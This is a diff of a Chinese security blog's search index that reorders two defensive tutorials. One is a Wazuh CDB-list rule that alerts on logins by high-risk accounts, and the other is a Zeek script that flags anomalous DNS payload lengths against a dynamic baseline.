@@ -1231,6 +1231,50 @@
       </tags>
   </entry>
   <entry>
+    <title>Wazuh - 黑名单匹配告警(CDB list)</title>
+    <url>/2019/10/18/Wazuh-Using-CDB-lists/</url>
+    <content><![CDATA[<p><strong>需求:</strong></p>
+<p>​        现有一批高危用户, 需要实时关注该账号的登录情况。由于之前已经写好了一个针对用户登录账号的审计规则, 因此, 这里需要用到**<a href="https://documentation.wazuh.com/3.10/user-manual/ruleset/cdb-list.html">Wazuh CDB list</a>**这个功能(<em>此功能主要用例是创建用户，IP或域名的白/黑列表。</em>)消费审计规则数据即可。</p>
+<hr>
+<ol>
+<li><strong>新建列表</strong></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more blacklist</span><br><span class="line"></span><br><span class="line">admin:</span><br><span class="line">root:</span><br><span class="line">administrator:</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>将列表文件添加到<code>ossec.conf</code></strong></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more ossec.conf</span><br><span class="line"></span><br><span class="line">&lt;ossec_config&gt;</span><br><span class="line">	&lt;ruleset&gt;</span><br><span class="line">    &lt;!-- User-defined CDB list --&gt;</span><br><span class="line">    &lt;list&gt;etc/lists/blacklist&lt;/list&gt;</span><br><span class="line">	&lt;/ruleset&gt;</span><br><span class="line">&lt;/ossec_config&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>编译列表</strong></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /var/ossec/bin/ossec-makelists</span><br><span class="line"></span><br><span class="line"> * File etc/lists/blacklist.cdb needs to be updated</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>重启进程</strong></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl restart wazuh-manager</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><strong>配置规则</strong></li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">&quot;local,blacklist,&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Defind blacklist Rules --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ID: 100150 - 100199 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;100163&quot;</span> <span class="attr">level</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_sid</span>&gt;</span>100303<span class="tag">&lt;/<span class="name">if_sid</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span> <span class="attr">field</span>=<span class="string">&quot;http.email&quot;</span> <span class="attr">lookup</span>=<span class="string">&quot;match_key&quot;</span>&gt;</span>etc/lists/blacklist<span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Wazuh Rules - High-risk user login detected. $(src_ip) -&gt; $(http.email) -&gt; $(http.hostname) -&gt; $(http.url) = $(http.results).<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>blacklist,<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li><strong>测试规则</strong></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./ossec-logtest</span><br><span class="line">2019/10/18 15:06:47 ossec-testrule: INFO: Started (pid: 2184).</span><br><span class="line">ossec-testrule: Type one <span class="built_in">log</span> per line.</span><br><span class="line"></span><br><span class="line">**Phase 3: Completed filtering (rules).</span><br><span class="line">       Rule id: <span class="string">&#x27;100163&#x27;</span></span><br><span class="line">       Level: <span class="string">&#x27;12&#x27;</span></span><br><span class="line">       Description: <span class="string">&#x27;Wazuh Rules - High-risk user login detected. 1.1.1.1 -&gt; admin -&gt; canon88.github.io -&gt; /user/login = success.&#x27;</span></span><br><span class="line">**Alert to be generated.</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>HIDS</category>
+      </categories>
+      <tags>
+        <tag>Wazuh</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Suricata + Lua实现本地情报对接</title>
     <url>/2019/10/24/Suricata+Lua%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E6%83%85%E6%8A%A5%E5%AF%B9%E6%8E%A5/</url>
     <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>​        由于近期网站遭受恶意攻击, 通过对于登录接口的审计与分析, 现已确定了一批可疑账号。既然之前写过一个登录接口的审计脚本, 那么完全可以通过扩展这个脚本来实现对于可疑账号的比对。主要思路: 通过将可疑账号存进Redis中, 再利用Lua脚本调用Redis接口进行账号的比对。</p>
@@ -1350,50 +1394,6 @@
       </categories>
       <tags>
         <tag>Suricata</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Wazuh - 黑名单匹配告警(CDB list)</title>
-    <url>/2019/10/18/Wazuh-Using-CDB-lists/</url>
-    <content><![CDATA[<p><strong>需求:</strong></p>
-<p>​        现有一批高危用户, 需要实时关注该账号的登录情况。由于之前已经写好了一个针对用户登录账号的审计规则, 因此, 这里需要用到**<a href="https://documentation.wazuh.com/3.10/user-manual/ruleset/cdb-list.html">Wazuh CDB list</a>**这个功能(<em>此功能主要用例是创建用户，IP或域名的白/黑列表。</em>)消费审计规则数据即可。</p>
-<hr>
-<ol>
-<li><strong>新建列表</strong></li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more blacklist</span><br><span class="line"></span><br><span class="line">admin:</span><br><span class="line">root:</span><br><span class="line">administrator:</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li><strong>将列表文件添加到<code>ossec.conf</code></strong></li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more ossec.conf</span><br><span class="line"></span><br><span class="line">&lt;ossec_config&gt;</span><br><span class="line">	&lt;ruleset&gt;</span><br><span class="line">    &lt;!-- User-defined CDB list --&gt;</span><br><span class="line">    &lt;list&gt;etc/lists/blacklist&lt;/list&gt;</span><br><span class="line">	&lt;/ruleset&gt;</span><br><span class="line">&lt;/ossec_config&gt;</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li><strong>编译列表</strong></li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /var/ossec/bin/ossec-makelists</span><br><span class="line"></span><br><span class="line"> * File etc/lists/blacklist.cdb needs to be updated</span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li><strong>重启进程</strong></li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl restart wazuh-manager</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li><strong>配置规则</strong></li>
-</ol>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">&quot;local,blacklist,&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Defind blacklist Rules --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ID: 100150 - 100199 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;100163&quot;</span> <span class="attr">level</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_sid</span>&gt;</span>100303<span class="tag">&lt;/<span class="name">if_sid</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span> <span class="attr">field</span>=<span class="string">&quot;http.email&quot;</span> <span class="attr">lookup</span>=<span class="string">&quot;match_key&quot;</span>&gt;</span>etc/lists/blacklist<span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Wazuh Rules - High-risk user login detected. $(src_ip) -&gt; $(http.email) -&gt; $(http.hostname) -&gt; $(http.url) = $(http.results).<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>blacklist,<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li><strong>测试规则</strong></li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./ossec-logtest</span><br><span class="line">2019/10/18 15:06:47 ossec-testrule: INFO: Started (pid: 2184).</span><br><span class="line">ossec-testrule: Type one <span class="built_in">log</span> per line.</span><br><span class="line"></span><br><span class="line">**Phase 3: Completed filtering (rules).</span><br><span class="line">       Rule id: <span class="string">&#x27;100163&#x27;</span></span><br><span class="line">       Level: <span class="string">&#x27;12&#x27;</span></span><br><span class="line">       Description: <span class="string">&#x27;Wazuh Rules - High-risk user login detected. 1.1.1.1 -&gt; admin -&gt; canon88.github.io -&gt; /user/login = success.&#x27;</span></span><br><span class="line">**Alert to be generated.</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>HIDS</category>
-      </categories>
-      <tags>
-        <tag>Wazuh</tag>
       </tags>
   </entry>
   <entry>
@@ -1864,6 +1864,69 @@
       </tags>
   </entry>
   <entry>
+    <title>How to use Zeek Detect Suspicious DNS traffic</title>
+    <url>/2024/08/10/Zeek-Detect-Suspicious-DNS-traffic/</url>
+    <content><![CDATA[<h4 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h4><p>​    我嘞个去！小不在意都已经到了2024的下半年了，近期花了一些时间研究了DNS异常流量的检测模型。老样子依旧是放在Zeek上来实现，Zeek作为网络流量的“瑞士军刀”可玩性还是很大的。由于现在写Blog时间太少了，这里将会通过分期的形式进行更新。</p>
+<p>​    本期主题是：如何通过 Zeek <a href="https://docs.zeek.org/en/master/frameworks/sumstats.html#summary-statistics">Summary Statistics</a> 实现<strong>动态基线</strong>，检测 DNS Payload 请求长度上的异常。</p>
+<h4 id="检测维度"><a href="#检测维度" class="headerlink" title="检测维度"></a>检测维度</h4><h5 id="1-请求包长度异常"><a href="#1-请求包长度异常" class="headerlink" title="1. 请求包长度异常"></a>1. 请求包长度异常</h5><p>​    通常最简单粗暴的方式就是通过手动指定一个<strong>『长度』</strong>作为告警阈值。但是难点就是<strong>『长度』</strong>设置为多少才算合适？长度设置较小，告警量多，误报率就会增加。长度设置较大，告警量少，但不一定会有告警。所以最好的方式就是能够动态计算一段时间内的<strong>『长度』</strong>作为阈值，以这个为基线去计算标准差和平均值再进行比对。</p>
+<ul>
+<li><p>定义一个动态基线时间窗口</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"># Global variable <span class="keyword">for</span> baseline interval</span><br><span class="line"><span class="keyword">const</span> baseline_interval: interval = <span class="number">300</span>sec &amp;redef; # Baseline interval <span class="keyword">for</span> SumStats collection</span><br></pre></td></tr></table></figure></li>
+<li><p>由于DNS在不同的请求类型下Payload长度也会有明显的差异，所以为了避免这类“干扰项”我们将按照DNS请求类型进行聚合来计算动态基线</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    # Define a record type to store the average <span class="keyword">and</span> standard deviation</span><br><span class="line">    type Stats: record &#123;</span><br><span class="line">        prev_avg: count; # Previous average payload size</span><br><span class="line">        prev_sd: count;  # Previous standard deviation of payload size</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    # Define a table to store the data</span><br><span class="line">    option data: table[string] of Stats;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>考虑到实际环境中DNS的请求数量会非常的多，我们也需要考虑代码在上线后对集群负载带来的影响。所以，这里将会通过<code>local_domain</code>、<code>ignore_qtypes</code>、<code>ignore_querys</code>、<code>ignore_subdomains</code>、<code>ignore_domains</code>、<code>ignore_tlds</code>等多个条件进行控制。</p>
+<ul>
+<li><strong>local_domian</strong>：代表实际环境中的内部域名，这些域名通常用于企业内网或者内部业务系统之间的通讯和API调用。通常这些域名不需要被列入到动态基线的计算范围内，因为它们在多数情况下都是在内部网络环境中使用，而非公开互联网访问。这有助于减少不必要的噪音和误报，提高基线计算的准确性。</li>
+<li><strong>ignore_qtypes</strong>：代表你需要忽略的DNS请求类型。</li>
+<li><strong>ignore_querys</strong>：代表你需要忽略的完整DNS请求。如：<code>canon88.github.io</code> 就是一个完整的域名请求</li>
+<li><strong>ignore_subdomains</strong>：代表你需要忽略的子域名。例如：在 <code>canon88.github.io</code> 中，<code>canon88</code> 就是子域名</li>
+<li><strong>ignore_domains</strong>：代表你需要忽略的主域名或二级域名。例如：在 <code>canon88.github.io</code> 中，<code>github.io</code> 是主域</li>
+<li><strong>ignore_tlds</strong>：代表你需要忽略的顶级域名（TLD）。例如：在 <code>canon88.github.io</code> 中，<code>io</code> 就是顶级域名。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event dns_message(c: connection, is_orig: bool, msg: dns_msg, len: count) &amp;priority=-10 &#123; </span><br><span class="line">		# Return early if the domain is local</span><br><span class="line">    if (c$dns$is_local_domain)</span><br><span class="line">        return;</span><br><span class="line">  </span><br><span class="line">    # Filter out queries of types that should be ignored</span><br><span class="line">    if (c$dns$qtype_name in SuspiciousDNSTraffic::ignore_qtypes)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    # Ignore trusted queries</span><br><span class="line">    if (c$dns$query in SuspiciousDNSTraffic::ignore_querys)</span><br><span class="line">        return;</span><br><span class="line">    </span><br><span class="line">    #  Ignore trusted subdomains</span><br><span class="line">    if ( (c$dns?$subdomain) &amp;&amp; (c$dns$subdomain in SuspiciousDNSTraffic::ignore_subdomains) )</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    # Ignore trusted domains</span><br><span class="line">    if ( (c$dns?$domain) &amp;&amp; (c$dns$domain in SuspiciousDNSTraffic::ignore_domains) )</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    # Ignore trusted top-level domains</span><br><span class="line">    if ( (c$dns?$tld) &amp;&amp; ( (c$dns$tld in SuspiciousDNSTraffic::ignore_tlds) || (SuspiciousDNSTraffic::ignore_tlds_regex in c$dns$tld) ) )</span><br><span class="line">        return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>下面开始进入“正题”，通过Zeek <a href="https://docs.zeek.org/en/master/frameworks/sumstats.html#summary-statistics">Summary Statistics</a> 进行 DNS Payload 动态基线的计算。</p>
+<ul>
+<li><p><strong>计算基线数据</strong>：使用 <code>SumStats</code> 模块每隔 <code>baseline_interval</code>（300秒） 计算一次 DNS 负载大小的平均值和标准差，并将这些数据存储在 <code>data</code> 表中。</p>
+</li>
+<li><p><strong>比对当前负载大小</strong>：在处理每个 DNS 消息时，当前负载大小（<code>len</code>）会与数据表中的先前平均值（<code>prev_avg</code>）和标准差（<code>prev_sd</code>）进行比对。</p>
+</li>
+<li><p><strong>比对阈值计算</strong>：</p>
+<ul>
+<li><p>最大平均值阈值：<code>avg * multiplier_threshold</code></p>
+</li>
+<li><p>最小平均值阈值：<code>avg / multiplier_threshold</code></p>
+</li>
+<li><p>最大标准差阈值：<code>avg + sd * deviation_threshold</code></p>
+</li>
+<li><p>最小标准差阈值：<code>avg - sd * deviation_threshold</code></p>
+</li>
+</ul>
+</li>
+<li><p><strong>确定可疑负载</strong>：</p>
+<ul>
+<li><p>如果当前负载大小超过最大平均值阈值或小于最小平均值阈值，则标记为可疑。</p>
+</li>
+<li><p>如果当前负载大小超过最大标准差阈值或小于最小标准差阈值，则标记为可疑。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Event handler for DNS messages</span><br><span class="line">event dns_message(c: connection, is_orig: bool, msg: dns_msg, len: count) &amp;priority=-10 &#123;</span><br><span class="line">    # Store the payload size in the DNS::Info record</span><br><span class="line">    c$dns$payload_len = len;</span><br><span class="line"></span><br><span class="line">    # Observe the payload size for SumStats calculations</span><br><span class="line">    SumStats::observe(&quot;dns_payload_len&quot;, SumStats::Key($str=c$dns$qtype_name), SumStats::Observation($num=len));</span><br><span class="line"></span><br><span class="line">    if (c$dns$qtype_name in data) &#123;</span><br><span class="line">        local avg = data[c$dns$qtype_name]$prev_avg;</span><br><span class="line">        local sd = data[c$dns$qtype_name]$prev_sd;</span><br><span class="line"></span><br><span class="line">        local max_avg_threshold = avg * SuspiciousDNSTraffic::multiplier_threshold;</span><br><span class="line">        local min_avg_threshold = avg / SuspiciousDNSTraffic::multiplier_threshold;</span><br><span class="line">        local max_sd_threshold = avg + sd * SuspiciousDNSTraffic::deviation_threshold;</span><br><span class="line">        local min_sd_threshold = avg - sd * SuspiciousDNSTraffic::deviation_threshold;</span><br><span class="line"></span><br><span class="line">        # Compare the current payload size with the calculated average and standard deviation</span><br><span class="line">        if ( avg != 0.0 ) &#123;</span><br><span class="line">            local alert_reason: set[string] = set();</span><br><span class="line">            if ( len &gt; max_avg_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$avg_threshold = max_avg_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &gt; avg_threshold&quot;];</span><br><span class="line">            &#125; else if ( len &lt; min_avg_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$avg_threshold = min_avg_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &lt; avg_threshold&quot;];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ( len &gt; max_sd_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$sd_threshold = max_sd_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &gt; sd_threshold&quot;];</span><br><span class="line">            &#125; else if ( len &lt; min_sd_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$sd_threshold = min_sd_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &lt; sd_threshold&quot;];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ( |alert_reason| &gt; 0 ) &#123;</span><br><span class="line">                c$dns$alert_reason = alert_reason;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # c$dns$payload_prev_avg = avg;</span><br><span class="line">        # c$dns$payload_prev_sd = sd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Initialize the event handler for analyzing DNS requests</span><br><span class="line">event zeek_init() &#123;</span><br><span class="line">    # Define a reducer to calculate the standard deviation of DNS payload sizes</span><br><span class="line">    local r_std_dev = SumStats::Reducer($stream=&quot;dns_payload_len&quot;, $apply=set(SumStats::STD_DEV));</span><br><span class="line"></span><br><span class="line">    # Create a SumStats object to collect data every baseline_interval (e.g. 5 minutes)</span><br><span class="line">    SumStats::create([</span><br><span class="line">        $name = &quot;dns_payload_len.std_dev&quot;,</span><br><span class="line">        $epoch = baseline_interval,</span><br><span class="line">        $reducers = set(r_std_dev),</span><br><span class="line">        $epoch_result(ts: time, key: SumStats::Key, result: SumStats::Result) = &#123; </span><br><span class="line">            local current_avg = double_to_count(result[&quot;dns_payload_len&quot;]$average);</span><br><span class="line">            local current_std_dev = double_to_count(result[&quot;dns_payload_len&quot;]$std_dev);</span><br><span class="line"></span><br><span class="line">            # Initialize the table with the given data</span><br><span class="line">            data[key$str] = [$prev_avg = current_avg, $prev_sd = current_std_dev];</span><br><span class="line"></span><br><span class="line">            # Update the data table with the new values</span><br><span class="line">            Config::set_value(&quot;SuspiciousDNSTraffic::data&quot;, data);</span><br><span class="line">        &#125;</span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.vjshi.com/2021-12-23/33ac8590ed1844d5bf0251349ea6da19/online/main.jpg?x-oss-process=style/video_cover_20231101" alt="未完待续视频素材下载, 未完待续AE模板下载_光厂(VJ师网)"></p>
+<h5 id="2-请求域名长度异常"><a href="#2-请求域名长度异常" class="headerlink" title="2. 请求域名长度异常"></a>2. 请求域名长度异常</h5><h5 id="3-非常见域名监控"><a href="#3-非常见域名监控" class="headerlink" title="3. 非常见域名监控"></a>3. 非常见域名监控</h5><h5 id="4-Fast-Flux"><a href="#4-Fast-Flux" class="headerlink" title="4. Fast Flux"></a>4. Fast Flux</h5><h5 id="5-非常见请求类型"><a href="#5-非常见请求类型" class="headerlink" title="5. 非常见请求类型"></a>5. 非常见请求类型</h5><h5 id="6-域名信誉度"><a href="#6-域名信誉度" class="headerlink" title="6. 域名信誉度"></a>6. 域名信誉度</h5>]]></content>
+      <categories>
+        <category>NTA</category>
+      </categories>
+      <tags>
+        <tag>Zeek</tag>
+        <tag>NTA</tag>
+        <tag>NIDS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>How to use Zeek Detect Sliver HTTP beacon traffic</title>
     <url>/2023/11/08/Zeek-Detect-Sliver/</url>
     <content><![CDATA[<p>​    废话少说，今天来给大家分享，如何利用Zeek实现对 <a href="https://github.com/BishopFox/sliver/">Sliver</a> Framework 中 HTTP C2 流量的检测。</p>
@@ -2058,147 +2121,6 @@
       </tags>
   </entry>
   <entry>
-    <title>How to use Zeek Detect Suspicious DNS traffic</title>
-    <url>/2024/08/10/Zeek-Detect-Suspicious-DNS-traffic/</url>
-    <content><![CDATA[<h4 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h4><p>​    我嘞个去！小不在意都已经到了2024的下半年了，近期花了一些时间研究了DNS异常流量的检测模型。老样子依旧是放在Zeek上来实现，Zeek作为网络流量的“瑞士军刀”可玩性还是很大的。由于现在写Blog时间太少了，这里将会通过分期的形式进行更新。</p>
-<p>​    本期主题是：如何通过 Zeek <a href="https://docs.zeek.org/en/master/frameworks/sumstats.html#summary-statistics">Summary Statistics</a> 实现<strong>动态基线</strong>，检测 DNS Payload 请求长度上的异常。</p>
-<h4 id="检测维度"><a href="#检测维度" class="headerlink" title="检测维度"></a>检测维度</h4><h5 id="1-请求包长度异常"><a href="#1-请求包长度异常" class="headerlink" title="1. 请求包长度异常"></a>1. 请求包长度异常</h5><p>​    通常最简单粗暴的方式就是通过手动指定一个<strong>『长度』</strong>作为告警阈值。但是难点就是<strong>『长度』</strong>设置为多少才算合适？长度设置较小，告警量多，误报率就会增加。长度设置较大，告警量少，但不一定会有告警。所以最好的方式就是能够动态计算一段时间内的<strong>『长度』</strong>作为阈值，以这个为基线去计算标准差和平均值再进行比对。</p>
-<ul>
-<li><p>定义一个动态基线时间窗口</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"># Global variable <span class="keyword">for</span> baseline interval</span><br><span class="line"><span class="keyword">const</span> baseline_interval: interval = <span class="number">300</span>sec &amp;redef; # Baseline interval <span class="keyword">for</span> SumStats collection</span><br></pre></td></tr></table></figure></li>
-<li><p>由于DNS在不同的请求类型下Payload长度也会有明显的差异，所以为了避免这类“干扰项”我们将按照DNS请求类型进行聚合来计算动态基线</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    # Define a record type to store the average <span class="keyword">and</span> standard deviation</span><br><span class="line">    type Stats: record &#123;</span><br><span class="line">        prev_avg: count; # Previous average payload size</span><br><span class="line">        prev_sd: count;  # Previous standard deviation of payload size</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    # Define a table to store the data</span><br><span class="line">    option data: table[string] of Stats;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>考虑到实际环境中DNS的请求数量会非常的多，我们也需要考虑代码在上线后对集群负载带来的影响。所以，这里将会通过<code>local_domain</code>、<code>ignore_qtypes</code>、<code>ignore_querys</code>、<code>ignore_subdomains</code>、<code>ignore_domains</code>、<code>ignore_tlds</code>等多个条件进行控制。</p>
-<ul>
-<li><strong>local_domian</strong>：代表实际环境中的内部域名，这些域名通常用于企业内网或者内部业务系统之间的通讯和API调用。通常这些域名不需要被列入到动态基线的计算范围内，因为它们在多数情况下都是在内部网络环境中使用，而非公开互联网访问。这有助于减少不必要的噪音和误报，提高基线计算的准确性。</li>
-<li><strong>ignore_qtypes</strong>：代表你需要忽略的DNS请求类型。</li>
-<li><strong>ignore_querys</strong>：代表你需要忽略的完整DNS请求。如：<code>canon88.github.io</code> 就是一个完整的域名请求</li>
-<li><strong>ignore_subdomains</strong>：代表你需要忽略的子域名。例如：在 <code>canon88.github.io</code> 中，<code>canon88</code> 就是子域名</li>
-<li><strong>ignore_domains</strong>：代表你需要忽略的主域名或二级域名。例如：在 <code>canon88.github.io</code> 中，<code>github.io</code> 是主域</li>
-<li><strong>ignore_tlds</strong>：代表你需要忽略的顶级域名（TLD）。例如：在 <code>canon88.github.io</code> 中，<code>io</code> 就是顶级域名。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event dns_message(c: connection, is_orig: bool, msg: dns_msg, len: count) &amp;priority=-10 &#123; </span><br><span class="line">		# Return early if the domain is local</span><br><span class="line">    if (c$dns$is_local_domain)</span><br><span class="line">        return;</span><br><span class="line">  </span><br><span class="line">    # Filter out queries of types that should be ignored</span><br><span class="line">    if (c$dns$qtype_name in SuspiciousDNSTraffic::ignore_qtypes)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    # Ignore trusted queries</span><br><span class="line">    if (c$dns$query in SuspiciousDNSTraffic::ignore_querys)</span><br><span class="line">        return;</span><br><span class="line">    </span><br><span class="line">    #  Ignore trusted subdomains</span><br><span class="line">    if ( (c$dns?$subdomain) &amp;&amp; (c$dns$subdomain in SuspiciousDNSTraffic::ignore_subdomains) )</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    # Ignore trusted domains</span><br><span class="line">    if ( (c$dns?$domain) &amp;&amp; (c$dns$domain in SuspiciousDNSTraffic::ignore_domains) )</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    # Ignore trusted top-level domains</span><br><span class="line">    if ( (c$dns?$tld) &amp;&amp; ( (c$dns$tld in SuspiciousDNSTraffic::ignore_tlds) || (SuspiciousDNSTraffic::ignore_tlds_regex in c$dns$tld) ) )</span><br><span class="line">        return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>下面开始进入“正题”，通过Zeek <a href="https://docs.zeek.org/en/master/frameworks/sumstats.html#summary-statistics">Summary Statistics</a> 进行 DNS Payload 动态基线的计算。</p>
-<ul>
-<li><p><strong>计算基线数据</strong>：使用 <code>SumStats</code> 模块每隔 <code>baseline_interval</code>（300秒） 计算一次 DNS 负载大小的平均值和标准差，并将这些数据存储在 <code>data</code> 表中。</p>
-</li>
-<li><p><strong>比对当前负载大小</strong>：在处理每个 DNS 消息时，当前负载大小（<code>len</code>）会与数据表中的先前平均值（<code>prev_avg</code>）和标准差（<code>prev_sd</code>）进行比对。</p>
-</li>
-<li><p><strong>比对阈值计算</strong>：</p>
-<ul>
-<li><p>最大平均值阈值：<code>avg * multiplier_threshold</code></p>
-</li>
-<li><p>最小平均值阈值：<code>avg / multiplier_threshold</code></p>
-</li>
-<li><p>最大标准差阈值：<code>avg + sd * deviation_threshold</code></p>
-</li>
-<li><p>最小标准差阈值：<code>avg - sd * deviation_threshold</code></p>
-</li>
-</ul>
-</li>
-<li><p><strong>确定可疑负载</strong>：</p>
-<ul>
-<li><p>如果当前负载大小超过最大平均值阈值或小于最小平均值阈值，则标记为可疑。</p>
-</li>
-<li><p>如果当前负载大小超过最大标准差阈值或小于最小标准差阈值，则标记为可疑。</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Event handler for DNS messages</span><br><span class="line">event dns_message(c: connection, is_orig: bool, msg: dns_msg, len: count) &amp;priority=-10 &#123;</span><br><span class="line">    # Store the payload size in the DNS::Info record</span><br><span class="line">    c$dns$payload_len = len;</span><br><span class="line"></span><br><span class="line">    # Observe the payload size for SumStats calculations</span><br><span class="line">    SumStats::observe(&quot;dns_payload_len&quot;, SumStats::Key($str=c$dns$qtype_name), SumStats::Observation($num=len));</span><br><span class="line"></span><br><span class="line">    if (c$dns$qtype_name in data) &#123;</span><br><span class="line">        local avg = data[c$dns$qtype_name]$prev_avg;</span><br><span class="line">        local sd = data[c$dns$qtype_name]$prev_sd;</span><br><span class="line"></span><br><span class="line">        local max_avg_threshold = avg * SuspiciousDNSTraffic::multiplier_threshold;</span><br><span class="line">        local min_avg_threshold = avg / 